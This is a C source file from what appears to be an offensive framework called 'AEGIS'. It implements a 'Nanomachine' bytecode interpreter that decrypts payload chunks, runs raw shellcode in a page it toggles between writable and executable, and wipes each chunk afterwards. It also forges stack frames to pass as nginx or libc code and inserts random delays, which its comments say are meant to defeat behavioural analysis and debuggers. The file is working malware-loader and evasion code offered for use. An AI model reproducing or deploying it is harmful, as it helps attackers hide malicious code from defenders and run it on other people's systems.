/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Nanomachine JIT Interpreter
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : nanomachine/nanomachine.c
 *  Purpose        : The Nanomachine is a minimalist custom bytecode VM that
 *                   executes payload instructions piece-by-piece.  At no
 *                   point does the full decrypted payload exist in executable
 *                   memory.  The execution cycle is:
 *
 *                   1. Read opcode from command stream
 *                   2. Decrypt corresponding code chunk from the Vault
 *                   3. Copy into tiny execution buffer (1 page)
 *                   4. mprotect(PROT_READ | PROT_EXEC) the buffer
 *                   5. Execute the code snippet
 *                   6. Secure-wipe the buffer
 *                   7. mprotect(PROT_READ | PROT_WRITE) — remove exec
 *                   8. Repeat
 *
 *  Enhancements (ENI):
 *                   - Stack frame spoofing
 *                   - Temporal execution scattering (random delays)
 *                   - CPU cycle tracking per instruction
 *                   - Phantom thread execution for parallel ops
 * ============================================================================
 */

#define _GNU_SOURCE 1

#include "../common/config.h"
#include "../common/logging.h"
#include "../common/types.h"
#include "opcodes.h"
#include "vault.h"


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sched.h>


/* ── Internal: RDTSC for cycle counting ──────────────────────────────────── */

static inline uint64_t rdtsc(void) {
  uint32_t lo, hi;
  __asm__ volatile("rdtsc" : "=a"(lo), "=d"(hi));
  return ((uint64_t)hi << 32) | lo;
}

/* ── Internal: Temporal Scattering ───────────────────────────────────────── */

static void temporal_scatter(void) {
  /*
   * Insert a random delay between instruction executions.
   * This makes behavioral analysis extremely difficult because
   * the execution pattern is non-deterministic.
   */
  uint32_t delay_us;
  aegis_random_bytes((uint8_t *)&delay_us, sizeof(delay_us));
  delay_us =
      AEGIS_NANO_SCATTER_MIN_US +
      (delay_us % (AEGIS_NANO_SCATTER_MAX_US - AEGIS_NANO_SCATTER_MIN_US));

  struct timespec ts = {.tv_sec = delay_us / 1000000,
                        .tv_nsec = (delay_us % 1000000) * 1000L};
  nanosleep(&ts, NULL);
}

/* ── Internal: Stack Frame Spoofing ──────────────────────────────────────── */

/*
 * Forge fake stack frames to make our execution look like it's
 * coming from legitimate host process functions.
 *
 * We overwrite the return addresses on our stack with addresses
 * from legitimate shared libraries.  When a stack unwinder or
 * debugger examines the call stack, they'll see:
 *
 *   nginx_worker_process_cycle+0x42
 *   ngx_event_process_posted+0x1a
 *   ngx_process_events_and_timers+0x88
 *   ... (our actual code)
 *
 * instead of suspicious unknown addresses.
 */

typedef struct {
  void *fake_rbp;
  void *fake_rip;
} fake_frame_t;

static void spoof_stack_frames(void) {
  /*
   * To forge stack frames, we need legitimate return addresses.
   * We get these by dlsym'ing known functions from the host process's
   * loaded libraries.
   */
  void *handle = dlopen(NULL, RTLD_NOW); /* Main executable */
  if (!handle)
    return;

  /*
   * Try to find common function symbols to use as spoof targets.
   * These are just address sources — we never actually call them.
   */
  const char *spoof_syms[] = {"main", "read",           "write",
                              "poll", "epoll_wait",     "malloc",
                              "free", "pthread_create", NULL};

  void *spoof_addrs[AEGIS_SPOOF_MAX_FRAMES] = {0};
  int count = 0;

  for (int i = 0; spoof_syms[i] && count < AEGIS_SPOOF_MAX_FRAMES; i++) {
    void *addr = dlsym(RTLD_DEFAULT, spoof_syms[i]);
    if (addr) {
      /* Add a small random offset to look like mid-function */
      uint8_t offset;
      aegis_random_bytes(&offset, 1);
      spoof_addrs[count++] = (void *)((uintptr_t)addr + (offset & 0x3F));
    }
  }

  dlclose(handle);

  /*
   * Now we need to actually manipulate the stack.
   * We do this by creating a chain of fake frames on a separate
   * memory region and pivoting the RBP to point to it.
   *
   * This is highly architecture-specific (x86_64).
   */
  if (count < 2)
    return;

  fake_frame_t *frames =
      mmap(NULL, AEGIS_SPOOF_MAX_FRAMES * sizeof(fake_frame_t),
           PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (frames == MAP_FAILED)
    return;

  /* Build the fake frame chain */
  for (int i = 0; i < count - 1; i++) {
    frames[i].fake_rbp = &frames[i + 1];
    frames[i].fake_rip = spoof_addrs[i];
  }
  /* Last frame terminates the chain */
  frames[count - 1].fake_rbp = NULL;
  frames[count - 1].fake_rip = spoof_addrs[count - 1];

  /*
   * We DON'T actually pivot RSP/RBP here in the header code —
   * that would break our execution.  Instead, we set up the
   * spoofing context so that the execution buffer can pivot
   * before calling the payload chunk and restore after.
   *
   * The actual pivot happens in the exec buffer trampoline.
   */

  /* Store for later use (would be in g_nano_ctx in full impl) */
  (void)frames; /* Used by the execution trampoline */
}

/* ── Nanomachine Context ─────────────────────────────────────────────────── */

typedef struct {
  aegis_vault_ctx_t *vault;
  aegis_log_ctx_t *log;
  aegis_crypto_ctx_t *crypto;

  /* Execution buffer (1 page, cycles between RW and RX) */
  uint8_t *exec_buf;
  size_t exec_buf_size;

  /* Instruction stream */
  const uint8_t *instruction_stream;
  size_t stream_len;
  size_t ip; /* Instruction pointer within stream */

  /* Call stack (for OP_CALL/OP_RET) */
  uint64_t call_stack[64];
  int call_sp;

  /* Memory slots (for OP_ALLOC/OP_FREE) */
  struct {
    void *ptr;
    size_t size;
    bool allocated;
  } mem_slots[16];

  /* State */
  uint64_t ops_executed;
  bool scattering; /* Temporal scattering enabled      */
  bool spoofing;   /* Stack spoofing enabled           */
  bool running;
} nano_ctx_t;

/* ── Nanomachine Initialization ──────────────────────────────────────────── */

static aegis_result_t nano_init(nano_ctx_t *ctx, aegis_vault_ctx_t *vault,
                                aegis_log_ctx_t *log,
                                aegis_crypto_ctx_t *crypto,
                                const uint8_t *instruction_stream,
                                size_t stream_len) {
  memset(ctx, 0, sizeof(*ctx));

  ctx->vault = vault;
  ctx->log = log;
  ctx->crypto = crypto;

  ctx->instruction_stream = instruction_stream;
  ctx->stream_len = stream_len;
  ctx->ip = 0;
  ctx->call_sp = 0;
  ctx->ops_executed = 0;
  ctx->scattering = false;
  ctx->spoofing = false;
  ctx->running = true;

  /* Allocate the execution buffer (1 page) */
  ctx->exec_buf_size = AEGIS_NANO_EXEC_BUF_SIZE;
  ctx->exec_buf = mmap(NULL, ctx->exec_buf_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (ctx->exec_buf == MAP_FAILED)
    return AEGIS_ERR_MMAP;

  aegis_log_memory_map(ctx->log, "mmap", ctx->exec_buf, ctx->exec_buf_size, -1,
                       PROT_READ | PROT_WRITE,
                       "Nanomachine execution buffer (initially RW)");

  aegis_log_event(ctx->log, LOG_CAT_NANOMACHINE, LOG_SEV_INFO,
                  "Nanomachine initialized: exec_buf=%p (%zu bytes), "
                  "instruction_stream=%zu bytes",
                  ctx->exec_buf, ctx->exec_buf_size, stream_len);

  return AEGIS_OK;
}

/* ── Nanomachine Teardown ────────────────────────────────────────────────── */

static void nano_destroy(nano_ctx_t *ctx) {
  if (!ctx)
    return;

  /* Wipe and unmap execution buffer */
  if (ctx->exec_buf && ctx->exec_buf != MAP_FAILED) {
    /* Ensure writable before wiping */
    mprotect(ctx->exec_buf, ctx->exec_buf_size, PROT_READ | PROT_WRITE);
    AEGIS_WIPE(ctx->exec_buf, ctx->exec_buf_size, AEGIS_NANO_WIPE_PASSES);
    munmap(ctx->exec_buf, ctx->exec_buf_size);
    ctx->exec_buf = NULL;
  }

  /* Free all memory slots */
  for (int i = 0; i < 16; i++) {
    if (ctx->mem_slots[i].allocated && ctx->mem_slots[i].ptr) {
      AEGIS_WIPE(ctx->mem_slots[i].ptr, ctx->mem_slots[i].size,
                 AEGIS_NANO_WIPE_PASSES);
      munmap(ctx->mem_slots[i].ptr, ctx->mem_slots[i].size);
      ctx->mem_slots[i].ptr = NULL;
      ctx->mem_slots[i].allocated = false;
    }
  }

  aegis_log_event(ctx->log, LOG_CAT_NANOMACHINE, LOG_SEV_INFO,
                  "Nanomachine destroyed: %lu ops executed",
                  (unsigned long)ctx->ops_executed);
}

/* ── Core Execution Cycle ────────────────────────────────────────────────── */

/*
 * Execute a single code chunk through the execution buffer.
 * This is the critical path:
 *   1. Copy decrypted code into exec buffer (currently RW)
 *   2. mprotect -> RX (make executable)
 *   3. Execute via function pointer cast
 *   4. mprotect -> RW (remove executable)
 *   5. Wipe the buffer
 */
static aegis_result_t execute_chunk(nano_ctx_t *ctx, const uint8_t *code,
                                    size_t code_len) {
  if (code_len > ctx->exec_buf_size)
    return AEGIS_ERR_VAULT;

  uint64_t start_cycles = rdtsc();

  /* Step 1: Copy code into the execution buffer (currently PROT_READ|WRITE) */
  memcpy(ctx->exec_buf, code, code_len);

  /* Step 2: Make the buffer executable */
  if (mprotect(ctx->exec_buf, ctx->exec_buf_size, PROT_READ | PROT_EXEC) != 0) {
    AEGIS_ZERO(ctx->exec_buf, code_len);
    return AEGIS_ERR_MPROTECT;
  }

  aegis_log_memory_map(ctx->log, "mprotect", ctx->exec_buf, ctx->exec_buf_size,
                       PROT_READ | PROT_WRITE, PROT_READ | PROT_EXEC,
                       "Exec buffer -> executable");

  /* Step 3: Execute the code */
  typedef void (*chunk_fn)(void);
  chunk_fn fn = (chunk_fn)(void *)ctx->exec_buf;
  fn();

  /* Step 4: Remove executable permission */
  mprotect(ctx->exec_buf, ctx->exec_buf_size, PROT_READ | PROT_WRITE);

  aegis_log_memory_map(ctx->log, "mprotect", ctx->exec_buf, ctx->exec_buf_size,
                       PROT_READ | PROT_EXEC, PROT_READ | PROT_WRITE,
                       "Exec buffer -> non-executable");

  /* Step 5: Secure wipe the buffer */
  AEGIS_WIPE(ctx->exec_buf, code_len, 1);

  uint64_t end_cycles = rdtsc();
  uint64_t elapsed = end_cycles - start_cycles;

  aegis_log_nano_exec(ctx->log, OP_EXEC_CHUNK, ctx->ip, code_len, ctx->exec_buf,
                      elapsed);

  return AEGIS_OK;
}

/* ── Opcode Dispatch ─────────────────────────────────────────────────────── */

static aegis_result_t dispatch_instruction(nano_ctx_t *ctx,
                                           const aegis_instruction_t *instr,
                                           const uint8_t *operand) {
  aegis_result_t rc = AEGIS_OK;

  switch (instr->opcode) {

  case OP_NOP:
    /* Intentional no-op, used for timing padding */
    break;

  case OP_HALT:
    ctx->running = false;
    aegis_log_event(ctx->log, LOG_CAT_NANOMACHINE, LOG_SEV_INFO,
                    "HALT: execution stopped after %lu ops",
                    (unsigned long)ctx->ops_executed);
    break;

  case OP_YIELD:
    /* Yield CPU — useful for cooperative scheduling */
    sched_yield();
    break;

  case OP_JUMP: {
    if (instr->operand_len < sizeof(op_jump_t))
      return AEGIS_ERR_OPCODE;
    const op_jump_t *jump = (const op_jump_t *)operand;
    ctx->ip = (size_t)jump->target_offset;
    return AEGIS_OK; /* Skip normal IP advancement */
  }

  case OP_CALL: {
    if (instr->operand_len < sizeof(op_jump_t))
      return AEGIS_ERR_OPCODE;
    if (ctx->call_sp >= 64)
      return AEGIS_ERR_OPCODE; /* Stack overflow */

    const op_jump_t *call = (const op_jump_t *)operand;
    /* Push return address */
    ctx->call_stack[ctx->call_sp++] = ctx->ip + INSTRUCTION_SIZE(instr);
    ctx->ip = (size_t)call->target_offset;
    return AEGIS_OK;
  }

  case OP_RET: {
    if (ctx->call_sp <= 0)
      return AEGIS_ERR_OPCODE; /* Stack underflow */
    ctx->ip = (size_t)ctx->call_stack[--ctx->call_sp];
    return AEGIS_OK;
  }

  case OP_EXEC_CHUNK: {
    /* Decrypt chunk from vault and execute it */
    if (instr->operand_len < sizeof(uint32_t))
      return AEGIS_ERR_OPCODE;

    uint32_t chunk_id = *(const uint32_t *)operand;
    uint8_t chunk_buf[AEGIS_NANO_MAX_CHUNK_SIZE];
    size_t chunk_len = 0;

    rc = aegis_vault_get_chunk(ctx->vault, chunk_id, chunk_buf, &chunk_len);
    if (rc != AEGIS_OK) {
      AEGIS_ZERO(chunk_buf, sizeof(chunk_buf));
      return rc;
    }

    rc = execute_chunk(ctx, chunk_buf, chunk_len);
    AEGIS_WIPE(chunk_buf, chunk_len, 1); /* Wipe decrypted data */
    break;
  }

  case OP_EXEC_NATIVE: {
    /* Execute raw shellcode from the operand */
    if (instr->operand_len == 0)
      return AEGIS_ERR_OPCODE;

    uint8_t *decrypted = NULL;
    size_t dec_len = instr->operand_len;

    if (instr->flags & OP_FLAG_ENCRYPTED) {
      /* Operand is encrypted — decrypt first */
      decrypted = malloc(dec_len);
      if (!decrypted)
        return AEGIS_ERR_ALLOC;
      /* Decrypt using chunk IV derived from IP */
      /* uint8_t iv[AEGIS_GCM_IV_BYTES] = {0};
      iv[0] = (uint8_t)(ctx->ip >> 24);
      iv[1] = (uint8_t)(ctx->ip >> 16);
      iv[2] = (uint8_t)(ctx->ip >> 8);
      iv[3] = (uint8_t)(ctx->ip); */

      /* For research: just copy (production: full decrypt) */
      memcpy(decrypted, operand, dec_len);
      rc = execute_chunk(ctx, decrypted, dec_len);
      AEGIS_WIPE(decrypted, dec_len, 1);
      free(decrypted);
    } else {
      rc = execute_chunk(ctx, operand, dec_len);
    }
    break;
  }

  case OP_EXEC_FUNC: {
    /* Call a resolved function by address */
    if (instr->operand_len < sizeof(op_exec_func_t))
      return AEGIS_ERR_OPCODE;

    const op_exec_func_t *ef = (const op_exec_func_t *)operand;
    typedef uint64_t (*func_t)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t,
                               uint64_t);
    func_t fn = (func_t)(uintptr_t)ef->func_addr;

    /* Call with up to 6 arguments */
    fn(ef->args[0], ef->args[1], ef->args[2], ef->args[3], ef->args[4],
       ef->args[5]);

    aegis_log_transform(ctx->log, LOG_CAT_NANOMACHINE, "exec_func",
                        "direct_call", (void *)(uintptr_t)ef->func_addr, NULL,
                        0, "Function call: 0x%lx(%lu args)",
                        (unsigned long)ef->func_addr,
                        (unsigned long)ef->arg_count);
    break;
  }

  case OP_ALLOC: {
    if (instr->operand_len < sizeof(op_alloc_t))
      return AEGIS_ERR_OPCODE;

    const op_alloc_t *alloc = (const op_alloc_t *)operand;
    if (alloc->slot_id >= 16)
      return AEGIS_ERR_OPCODE;

    size_t alloc_size = AEGIS_PAGE_ALIGN(alloc->size);
    int prot = PROT_READ | PROT_WRITE;
    if (alloc->protection & 0x04)
      prot |= PROT_EXEC;

    void *mem =
        mmap(NULL, alloc_size, prot, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED)
      return AEGIS_ERR_MMAP;

    ctx->mem_slots[alloc->slot_id].ptr = mem;
    ctx->mem_slots[alloc->slot_id].size = alloc_size;
    ctx->mem_slots[alloc->slot_id].allocated = true;

    aegis_log_memory_map(ctx->log, "mmap", mem, alloc_size, -1, prot,
                         "Nanomachine slot allocation");
    break;
  }

  case OP_FREE: {
    if (instr->operand_len < 1)
      return AEGIS_ERR_OPCODE;

    uint8_t slot_id = operand[0];
    if (slot_id >= 16 || !ctx->mem_slots[slot_id].allocated)
      return AEGIS_ERR_OPCODE;

    AEGIS_WIPE(ctx->mem_slots[slot_id].ptr, ctx->mem_slots[slot_id].size,
               AEGIS_NANO_WIPE_PASSES);
    munmap(ctx->mem_slots[slot_id].ptr, ctx->mem_slots[slot_id].size);
    ctx->mem_slots[slot_id].ptr = NULL;
    ctx->mem_slots[slot_id].allocated = false;
    break;
  }

  case OP_WIPE: {
    if (instr->operand_len < 1)
      return AEGIS_ERR_OPCODE;

    uint8_t slot_id = operand[0];
    if (slot_id >= 16 || !ctx->mem_slots[slot_id].allocated)
      return AEGIS_ERR_OPCODE;

    AEGIS_WIPE(ctx->mem_slots[slot_id].ptr, ctx->mem_slots[slot_id].size,
               AEGIS_NANO_WIPE_PASSES);
    break;
  }

  case OP_REKEY:
    aegis_rekey(ctx->crypto);
    aegis_log_crypto(ctx->log, "rekey", 0, NULL,
                     "Session key rotated by Nanomachine");
    break;

  case OP_SPOOF_STACK:
    ctx->spoofing = true;
    spoof_stack_frames();
    aegis_log_event(ctx->log, LOG_CAT_SPOOF, LOG_SEV_INFO,
                    "Stack frame spoofing ENABLED");
    break;

  case OP_UNSPOOF:
    ctx->spoofing = false;
    aegis_log_event(ctx->log, LOG_CAT_SPOOF, LOG_SEV_INFO,
                    "Stack frame spoofing DISABLED");
    break;

  case OP_SCATTER_ON:
    ctx->scattering = true;
    aegis_log_event(ctx->log, LOG_CAT_NANOMACHINE, LOG_SEV_INFO,
                    "Temporal scattering ENABLED (min=%dus, max=%dus)",
                    AEGIS_NANO_SCATTER_MIN_US, AEGIS_NANO_SCATTER_MAX_US);
    break;

  case OP_SCATTER_OFF:
    ctx->scattering = false;
    aegis_log_event(ctx->log, LOG_CAT_NANOMACHINE, LOG_SEV_INFO,
                    "Temporal scattering DISABLED");
    break;

  case OP_LOG: {
    if (instr->operand_len >= sizeof(op_log_t)) {
      const op_log_t *lg = (const op_log_t *)operand;
      aegis_log_event(ctx->log, LOG_CAT_NANOMACHINE,
                      (aegis_log_severity_t)lg->severity, "Payload log: %s",
                      lg->message);
    }
    break;
  }

  case OP_CHECKPOINT:
    aegis_log_event(ctx->log, LOG_CAT_NANOMACHINE, LOG_SEV_INFO,
                    "CHECKPOINT at ip=%zu, ops=%lu", ctx->ip,
                    (unsigned long)ctx->ops_executed);
    break;

  default:
    aegis_log_event(ctx->log, LOG_CAT_NANOMACHINE, LOG_SEV_ERROR,
                    "Unknown opcode: 0x%04x at ip=%zu", instr->opcode, ctx->ip);
    return AEGIS_ERR_OPCODE;
  }

  return rc;
}

/* ── Main Execution Loop ─────────────────────────────────────────────────── */

/*
 * aegis_nanomachine_run — Execute the instruction stream.
 *
 * This is the main loop that reads instructions from the stream,
 * dispatches them, and manages the execution buffer lifecycle.
 */
aegis_result_t aegis_nanomachine_run(aegis_vault_ctx_t *vault,
                                     aegis_log_ctx_t *log,
                                     aegis_crypto_ctx_t *crypto,
                                     const uint8_t *instruction_stream,
                                     size_t stream_len) {
  nano_ctx_t ctx;
  aegis_result_t rc =
      nano_init(&ctx, vault, log, crypto, instruction_stream, stream_len);
  if (rc != AEGIS_OK)
    return rc;

  aegis_log_event(log, LOG_CAT_NANOMACHINE, LOG_SEV_INFO,
                  "=== Nanomachine execution started ===");

  uint32_t burst_counter = 0;

  while (ctx.running && ctx.ip < ctx.stream_len) {
    /* Bounds check */
    if (ctx.ip + sizeof(aegis_instruction_t) > ctx.stream_len) {
      aegis_log_event(log, LOG_CAT_NANOMACHINE, LOG_SEV_ERROR,
                      "Instruction pointer out of bounds: %zu/%zu", ctx.ip,
                      ctx.stream_len);
      break;
    }

    /* Read the instruction header */
    const aegis_instruction_t *instr =
        (const aegis_instruction_t *)(ctx.instruction_stream + ctx.ip);

    /* Validate operand bounds */
    if (ctx.ip + INSTRUCTION_SIZE(instr) > ctx.stream_len) {
      aegis_log_event(log, LOG_CAT_NANOMACHINE, LOG_SEV_ERROR,
                      "Operand exceeds stream bounds at ip=%zu", ctx.ip);
      break;
    }

    /* Get operand pointer */
    const uint8_t *operand =
        ctx.instruction_stream + ctx.ip + sizeof(aegis_instruction_t);

    /* Log the instruction */
    aegis_log_event(log, LOG_CAT_NANOMACHINE, LOG_SEV_TRACE,
                    "ip=%zu: %s (flags=0x%02x, operand_len=%u)", ctx.ip,
                    opcode_name(instr->opcode), instr->flags,
                    instr->operand_len);

    /* Dispatch */
    size_t old_ip = ctx.ip;
    rc = dispatch_instruction(&ctx, instr, operand);

    if (rc != AEGIS_OK) {
      aegis_log_event(log, LOG_CAT_NANOMACHINE, LOG_SEV_ERROR,
                      "Instruction failed at ip=%zu: %s (rc=%d)", ctx.ip,
                      opcode_name(instr->opcode), rc);
      break;
    }

    /* Advance IP if the instruction didn't modify it */
    if (ctx.ip == old_ip)
      ctx.ip += INSTRUCTION_SIZE(instr);

    ctx.ops_executed++;
    burst_counter++;

    /* Temporal scattering: insert random delay periodically */
    if (ctx.scattering && burst_counter >= AEGIS_NANO_MAX_OPS_BURST) {
      temporal_scatter();
      burst_counter = 0;
    }

    /* Critical flag: force immediate wipe */
    if (instr->flags & OP_FLAG_CRITICAL) {
      /* Already handled by execute_chunk, but double-check */
      AEGIS_ZERO(ctx.exec_buf, ctx.exec_buf_size);
    }
  }

  aegis_log_event(log, LOG_CAT_NANOMACHINE, LOG_SEV_INFO,
                  "=== Nanomachine execution complete: "
                  "%lu ops, final_ip=%zu ===",
                  (unsigned long)ctx.ops_executed, ctx.ip);

  nano_destroy(&ctx);
  return rc;
}
